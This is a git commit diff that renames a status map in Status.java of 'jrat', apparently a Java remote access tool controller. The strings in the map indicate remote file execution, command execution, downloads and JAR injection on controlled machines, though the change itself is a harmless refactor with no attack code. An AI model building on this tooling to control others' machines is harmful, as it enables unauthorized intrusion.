234ba72e44a39d3c38ec9eb43f16f21d45a721cb
redpois0n <red@cmail.nu>
2016-09-05 14:16:48 +0100

    Change variable name

--- Controller/src/io/jrat/controller/Status.java
+++ Controller/src/io/jrat/controller/Status.java
@@ -3,26 +3,27 @@ package io.jrat.controller;
 import io.jrat.common.Constants;
 
 import java.util.HashMap;
+import java.util.Map;
 
 public class Status {
 
-	private static final HashMap<Integer, String> statuses = new HashMap<Integer, String>();
+	private static final Map<Integer, String> STATUSES = new HashMap<Integer, String>();
 
 	static {
-		statuses.put(Constants.STATUS_EXECUTED_FILE, "Executed file");
-		statuses.put(Constants.STATUS_DOWNLOADING_FILE, "Downloading...");
-		statuses.put(Constants.STATUS_FAILED_FILE, "Failed downloading");
-		statuses.put(Constants.STATUS_READY, "Ready");
-		statuses.put(Constants.STATUS_DISPLAYED_MSGBOX, "Opened messagebox");
-		statuses.put(Constants.STATUS_FAILED_SHUTDOWN, "Failed shutdown");
-		statuses.put(Constants.STATUS_STARTING_SHUTDOWN, "Starting shutdown");
-		statuses.put(Constants.STATUS_RAN_CMD, "Executed command");
-		statuses.put(Constants.STATUS_MKDIR, "Folder created");
-		statuses.put(Constants.STATUS_INJECTED, "Injected JAR");
+		STATUSES.put(Constants.STATUS_EXECUTED_FILE, "Executed file");
+		STATUSES.put(Constants.STATUS_DOWNLOADING_FILE, "Downloading...");
+		STATUSES.put(Constants.STATUS_FAILED_FILE, "Failed downloading");
+		STATUSES.put(Constants.STATUS_READY, "Ready");
+		STATUSES.put(Constants.STATUS_DISPLAYED_MSGBOX, "Opened messagebox");
+		STATUSES.put(Constants.STATUS_FAILED_SHUTDOWN, "Failed shutdown");
+		STATUSES.put(Constants.STATUS_STARTING_SHUTDOWN, "Starting shutdown");
+		STATUSES.put(Constants.STATUS_RAN_CMD, "Executed command");
+		STATUSES.put(Constants.STATUS_MKDIR, "Folder created");
+		STATUSES.put(Constants.STATUS_INJECTED, "Injected JAR");
 	}
 
 	public static String getStatusFromID(int i) {
-		return statuses.get(i);
+		return STATUSES.get(i);
 	}
 
 }
